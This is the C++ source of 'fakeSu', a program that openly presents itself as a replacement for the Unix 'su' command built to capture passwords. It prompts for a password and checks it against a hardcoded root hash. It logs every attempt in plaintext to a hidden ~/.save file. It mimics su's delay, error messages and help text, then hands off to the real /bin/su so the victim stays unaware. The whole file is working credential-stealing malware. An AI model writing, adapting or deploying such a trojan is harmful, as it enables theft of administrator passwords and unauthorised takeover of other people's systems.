 /********************************************************************************************
 * fakeSu. Replace the "su" command, check the input and save the password entered in a file.*
 * Copyright (C) 2017-2018 Davide sofronia.                                                  *
 *                                                                                           *
 * This program is free software: you can redistribute it and/or modify                      *
 * it under the terms of the GNU General Public License as published by                      *
 * the Free Software Foundation, either version 3 of the License, or                         *
 * (at your option) any later version.                                                       *
 *                                                                                           *
 * This program is distributed in the hope that it will be useful,                           *
 * but WITHOUT ANY WARRANTY; without even the implied warranty of                            *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                             *
 * GNU General Public License for more details.                                              *
 *                                                                                           *
 * You should have received a copy of the GNU General Public License                         *
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.                     *
 * Written by Davide Sofronia <davidesofronia@gmail.com>.                                    *
 ********************************************************************************************/

#include <iostream>
#include <cstdlib>
#include <cstdio>
#include <fstream>
#include <ctime>
#include <string>
#include <unistd.h>
#include <stdexcept>
#include <crypt.h>

#define DEFAULT_USER "root"
#define SALT "$6$6LxYfOg6"
#define HASH "$6$6LxYfOg6$py1X/6QN71BhITpR4mHnVM7ux6/CxS5uCIup9dSiXLoEXox.493fHuk9R6FAtu9rhT2Y3q0tjm8vAFAgKFb6U0"

void usage();

int main(int argc, char *argv[]) 
{
	/*== Variables ==*/
	std::string passwd, user, command, createdHash;
	std::string path = "/home/"+std::string(getlogin())+"/.save";
	std::ofstream passwdFile;

        /*== Control args ==*/
        try {
	    if (std::string(argv[1]) == "-h" || std::string(argv[1]) == "--help") {
		    	usage();
			return 0;
        	} else {
            		user = std::string(argv[1]);            
        	}
    	} catch (std::logic_error) {
        	user = DEFAULT_USER;
    	}

	/*== Take the password ==*/
	passwd = std::string(getpass("Password: "));
	sleep(2); // Simulate real su

	/*== Crypt the password SHA-512 ==*/
	createdHash = std::string(crypt(passwd.c_str(), SALT));

	/*== Open passwd File path ==*/
	passwdFile.open(path, std::ios::app);
	if (!passwdFile.is_open()) {
		std::cerr << "An error has occured\n";
        	passwdFile.close();
        	return -2;
    	}
    	/*== Set date ==*/
    	time_t now = time(0);
    	char* tmp = ctime(&now);
    	std::string date = std::string(tmp);
    	date.erase(date.length()-1, 1);

    	/*== Control hash ==*/
    	if (createdHash == HASH) {
        	/*== CORRECT ==*/
       		passwdFile << "CORRECT (" << date << "): " << passwd << '\n';
        	passwdFile.close();
        	std::cerr << "An error has occured, Retry\n";
	
        	/*== Start the real su ==*/
        	execv("/bin/su", argv);
        	return 0;    
    	} else {
        	/*== ERROR ==*/
        	passwdFile << "ERROR (" << date << "): " << passwd << '\n';
        	passwdFile.close();
        	std::cerr << "su: Authentication failure\n";
        	return 1;
    	}
}

void usage() 
{
	std::cout << 
	"Usage: su [OPTION] [LOGIN]\n\n"
	"Options:\n"
	"-c, --command COMMAND   pass COMMAND to the invoked shell\n"
	"-h, --help              display this help message and exit\n"
	"-, -l, --login          make the shell a login shell\n"
	"-m, -p,\n"
	"--preserve-environment  do not reset environment variables, and\n"
	"                        keep the same shell\n"
	"-s, --shell SHELL       use SHELL instead of the default in passwd\n";
	return;
}